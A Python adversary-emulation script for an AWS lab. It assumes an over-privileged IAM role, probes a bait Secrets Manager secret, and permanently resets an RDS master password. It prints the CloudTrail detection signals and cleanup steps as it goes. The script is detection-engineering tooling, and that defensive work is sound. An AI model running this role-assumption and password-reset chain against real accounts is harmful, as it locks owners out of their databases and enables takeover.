# FILE: attack.py
"""
ATOMIC_RDS_RESET_MASTER_PASSWORD - Adversary Emulation Attack Script
Executes a 3-phase attack chain modelling a compromised DB-management principal:
  Phase 1 - Assume victim-role via STS (T1213)
  Phase 2 - Enumerate Secrets Manager bait secret (AccessDenied expected - detection signal)
  Phase 3 - Confirm RDS target then reset master password via rds:ModifyDBInstance (T1213)
"""
import sys
import time
import random
import secrets
import json
import pathlib
import boto3
from botocore.exceptions import ClientError

# Cross-platform UTF-8 output - prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ── Resource names: single source of truth ──────────────────────────────────
_NAMES_FILE = pathlib.Path(__file__).parent / "infra" / "resource_names.json"
if _NAMES_FILE.exists():
    _NAMES = json.loads(_NAMES_FILE.read_text(encoding="utf-8"))
else:
    _NAMES = {"resources": {}, "pulumi_export_keys": {}}
    print(f"[!] resource_names.json not found at {_NAMES_FILE} - falling back to empty name maps")

_R   = _NAMES.get("resources", {})
_PKS = _NAMES.get("pulumi_export_keys", {})


_TENANT_CREDS = {}


def _set_tenant_credentials(outputs):
    """Remember the tenant's short-lived credentials. In the MayaTrail backend the
    worker injects them as outputs['_aws_credentials']; without this the first STS
    call would run as the Celery worker identity instead of the tenant account."""
    _TENANT_CREDS.clear()
    _TENANT_CREDS.update((outputs or {}).get("_aws_credentials") or {})


def _base_session(region):
    """Session for the tenant's connected role, or the ambient default session for
    standalone runs where no credentials were injected."""
    if _TENANT_CREDS:
        return boto3.Session(
            aws_access_key_id=_TENANT_CREDS.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=_TENANT_CREDS.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=_TENANT_CREDS.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _r(key, default=""):
    """Resolve a static resource name from resource_names.json."""
    return _R.get(key, default)


def _p(outputs, key, default=""):
    """Resolve a dynamic Pulumi output value via pulumi_export_keys -> outputs dict -> default."""
    export_key = _PKS.get(key, key)
    return outputs.get(export_key, default)


def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))


def phase_delay():
    time.sleep(random.uniform(5, 15))


def print_step(msg):
    print(f"\n[*] {msg}")


def print_ok(msg):
    print(f"[+] {msg}")


def print_err(msg):
    print(f"[-] {msg}")


def run(outputs: dict, region: str = "us-east-1") -> None:
    """
    Entry point for ATOMIC_RDS_RESET_MASTER_PASSWORD emulation.

    Required outputs keys (resolved via pulumi_export_keys in resource_names.json):
      victim_role_arn  - ARN of the over-privileged DB-management IAM role to assume
      bait_secret_arn  - ARN of bait Secrets Manager secret (optional; steps skipped if absent)

    Static names resolved from resource_names.json['resources']:
      rds_instance_identifier - DB instance identifier for the target lab RDS instance
    """
    # ── Resolve names ─────────────────────────────────────────────────────────
    # Dynamic values - ARNs assigned by AWS at deploy time
    _set_tenant_credentials(outputs)

    victim_role_arn = _p(outputs, "victim_role_arn")
    bait_secret_arn = _p(outputs, "bait_secret_arn")

    # Static name - deterministic identifier set in __main__.py, never changes
    rds_instance_id = _r("rds_instance_identifier")

    if not victim_role_arn:
        raise RuntimeError("Missing required output: victim_role_arn (pulumi_export_key: victim_role_arn)")
    if not rds_instance_id:
        raise RuntimeError("Missing static resource name: rds_instance_identifier in resource_names.json")
    if not bait_secret_arn:
        print_err("bait_secret_arn not in outputs - Secrets Manager steps will be skipped")

    events_generated = []

    # =========================================================================
    # PHASE 1: Credential Bootstrap - Assume Victim Role
    # =========================================================================
    print("\n" + "=" * 60)
    print("[*] PHASE 1: Credential Bootstrap - Assume Victim Role")
    print("=" * 60)
    print_step(
        "Assuming victim-role via sts:AssumeRole to obtain DB-management session credentials"
    )
    print(f"    Role ARN:    {victim_role_arn}")
    print(f"    Session:     atomic-rds-reset-master-password-session")
    print(f"    Duration:    3600 s")

    try:
        default_session = _base_session(region)
        sts_client = default_session.client("sts")
        assume_resp = sts_client.assume_role(
            RoleArn=victim_role_arn,
            RoleSessionName="atomic-rds-reset-master-password-session",
            DurationSeconds=3600,
        )
    except ClientError as e:
        raise RuntimeError(f"sts:AssumeRole failed: {e}") from e

    creds = assume_resp["Credentials"]
    victim_session = boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"],
        region_name=region,
    )
    print_ok(f"Assumed victim-role; session key prefix: {creds['AccessKeyId'][:8]}...")
    events_generated.append(
        "sts:AssumeRole -> atomic-rds-reset-master-password-session [CloudTrail: AssumeRole]"
    )

    op_delay(2, 4)
    phase_delay()

    # =========================================================================
    # PHASE 2: Bait Discovery - Secrets Manager Enumeration
    # =========================================================================
    print("\n" + "=" * 60)
    print("[*] PHASE 2: Bait Discovery - Secrets Manager Enumeration")
    print("=" * 60)
    print("    NOTE: victim-role-policy does not grant secretsmanager actions.")
    print("    AccessDenied responses ARE the detection signal - chain continues regardless.")

    sm_client = victim_session.client("secretsmanager")

    # -- Step 2: ListSecrets - expected AccessDenied ---------------------------
    print_step("Attempting secretsmanager:ListSecrets to discover credential stores")
    try:
        sm_client.list_secrets()
        print_ok("ListSecrets succeeded (UNEXPECTED - victim-role should not have this grant)")
        events_generated.append("secretsmanager:ListSecrets -> SUCCESS (unexpected)")
    except ClientError as e:
        code = e.response["Error"]["Code"]
        if code in ("AccessDenied", "AccessDeniedException"):
            print_ok(
                f"ListSecrets -> {code} (expected) - denied CloudTrail event is the detection signal"
            )
            events_generated.append(
                f"secretsmanager:ListSecrets -> {code} [CloudTrail: ListSecrets denied]"
            )
        else:
            print_err(f"ListSecrets unexpected error ({code}): {e}")
            events_generated.append(f"secretsmanager:ListSecrets -> {code} (unexpected error)")

    op_delay(2, 5)

    # -- Step 3: GetSecretValue on bait secret - expected AccessDenied ---------
    if bait_secret_arn:
        print_step(
            "Attempting secretsmanager:GetSecretValue on bait prod/database/master_credentials"
        )
        print(f"    Secret ARN: {bait_secret_arn}")
        try:
            sm_client.get_secret_value(SecretId=bait_secret_arn)
            print_ok(
                "GetSecretValue succeeded (UNEXPECTED - victim-role should not have this grant)"
            )
            events_generated.append("secretsmanager:GetSecretValue -> SUCCESS (unexpected)")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("AccessDenied", "AccessDeniedException"):
                print_ok(
                    f"GetSecretValue -> {code} (expected) - denied CloudTrail event is the detection signal"
                )
                events_generated.append(
                    f"secretsmanager:GetSecretValue -> {code} [CloudTrail: GetSecretValue denied"
                    f" on prod/database/master_credentials]"
                )
            else:
                print_err(f"GetSecretValue unexpected error ({code}): {e}")
                events_generated.append(
                    f"secretsmanager:GetSecretValue -> {code} (unexpected error)"
                )
    else:
        print_step("Skipping GetSecretValue - bait_secret_arn not available in outputs")

    op_delay(2, 5)
    phase_delay()

    # =========================================================================
    # PHASE 3: RDS Master Password Reset (T1213)
    # Wrapped in try/finally: cleanup notes always print even if a step fails mid-run.
    # Note: a ModifyDBInstance password reset cannot be reversed without the original
    # password; the lab instance is ephemeral and removed by pulumi destroy.
    # =========================================================================
    print("\n" + "=" * 60)
    print("[*] PHASE 3: RDS Master Password Reset (T1213)")
    print("=" * 60)

    rds_client = victim_session.client("rds")

    # -- Step 4: DescribeDBInstances - confirm target before acting (read-only) -
    print_step(
        f"Calling rds:DescribeDBInstances to confirm target instance: {rds_instance_id}"
    )
    try:
        desc_resp = rds_client.describe_db_instances(
            DBInstanceIdentifier=rds_instance_id
        )
    except ClientError as e:
        code = e.response["Error"]["Code"]
        raise RuntimeError(
            f"rds:DescribeDBInstances failed ({code}) for {rds_instance_id}: {e}"
        ) from e

    db_list = desc_resp.get("DBInstances", [])
    if not db_list:
        raise RuntimeError(
            f"DescribeDBInstances returned no instances for identifier: {rds_instance_id}"
        )
    db = db_list[0]
    db_status = db.get("DBInstanceStatus", "unknown")
    db_engine = db.get("Engine", "unknown")
    db_engine_ver = db.get("EngineVersion", "unknown")

    print_ok(f"DB instance confirmed: {rds_instance_id}")
    print(f"    Status:  {db_status}")
    print(f"    Engine:  {db_engine} {db_engine_ver}")

    if db_status != "available":
        print_err(
            f"WARNING: instance status is '{db_status}' (expected 'available') - "
            f"proceeding with reset anyway"
        )
    events_generated.append(
        f"rds:DescribeDBInstances -> {rds_instance_id} status={db_status}"
        f" [CloudTrail: DescribeDBInstances]"
    )

    op_delay(2, 4)

    # -- Step 5: ModifyDBInstance - reset master password (mutating) -----------
    # try/finally ensures cleanup notes always print; no programmatic revert is
    # possible (original password unknown); lab instance is destroyed by pulumi.
    new_pw = secrets.token_urlsafe(24)
    safe_log_pw = new_pw[:4] + "****"
    try:
        print_step(
            "Generating cryptographically random master password (secrets.token_urlsafe(24))"
        )
        print(f"    New password prefix: {safe_log_pw} (full value not logged for safety)")
        print_step(
            f"Calling rds:ModifyDBInstance to reset master password on {rds_instance_id}"
        )
        print("    ApplyImmediately=True - change applied without waiting for maintenance window")
        print(
            "    CloudTrail will record requestParameters.masterUserPassword"
            " as HIDDEN_DUE_TO_SECURITY_REASONS"
        )

        try:
            modify_resp = rds_client.modify_db_instance(
                DBInstanceIdentifier=rds_instance_id,
                MasterUserPassword=new_pw,
                ApplyImmediately=True,
            )
        except ClientError as e:
            code = e.response["Error"]["Code"]
            raise RuntimeError(
                f"rds:ModifyDBInstance failed ({code}) for {rds_instance_id}: {e}"
            ) from e

        modified_db = modify_resp.get("DBInstance", {})
        post_status = modified_db.get("DBInstanceStatus", "unknown")

        print_ok("rds:ModifyDBInstance succeeded - master password reset complete")
        print(f"    Instance status after call: {post_status}")
        print(
            "    Primary detection signal: ModifyDBInstance with"
            " masterUserPassword HIDDEN_DUE_TO_SECURITY_REASONS from a non-DBA principal"
        )
        events_generated.append(
            f"rds:ModifyDBInstance -> {rds_instance_id} masterUserPassword=HIDDEN"
            f" ApplyImmediately=true [CloudTrail: ModifyDBInstance - T1213 primary signal]"
        )

        op_delay(5, 10)

    finally:
        # Always print cleanup guidance whether the mutation succeeded or failed.
        # A password reset cannot be reversed programmatically without the original value;
        # the RDS instance is lab-owned and will be fully removed by pulumi destroy.
        print("\n[*] Phase 3 cleanup notes:")
        print("  - Password reset is permanent for lab instance lifetime")
        print("    (no programmatic revert - original password not retained)")
        print("  - STS session expires automatically after 1 hour; no revocation needed")
        print(f"  - Run 'pulumi destroy' in the infra/ directory to remove {rds_instance_id}")
        print("    and all associated lab resources (vpc, subnets, sg, bait-master-credentials,")
        print("    victim-role)")

    # ── Attack Summary ─────────────────────────────────────────────────────────
    print("\n" + "=" * 60)
    print("[*] ATOMIC_RDS_RESET_MASTER_PASSWORD - Events Generated")
    print("=" * 60)
    for i, event in enumerate(events_generated, 1):
        print(f"  {i}. {event}")
    print()
    print("[*] Detection Notes:")
    print("  - sts:AssumeRole from pipeline admin into victim-role with session name")
    print("    'atomic-rds-reset-master-password-session' (unusual session name)")
    print("  - secretsmanager:ListSecrets AccessDenied from DB-management principal")
    print("    (unusual - DB roles do not typically enumerate secrets)")
    print("  - secretsmanager:GetSecretValue AccessDenied on prod/database/master_credentials")
    print("    (attacker confirming target before acting)")
    print("  - rds:DescribeDBInstances from victim-role (attacker scoping target instance)")
    print("  - rds:ModifyDBInstance masterUserPassword HIDDEN_DUE_TO_SECURITY_REASONS")
    print("    from a principal that is NOT the DBA or secrets-rotation role,")
    print("    outside any scheduled maintenance window")
    print()
    print_ok("ATOMIC_RDS_RESET_MASTER_PASSWORD emulation complete")
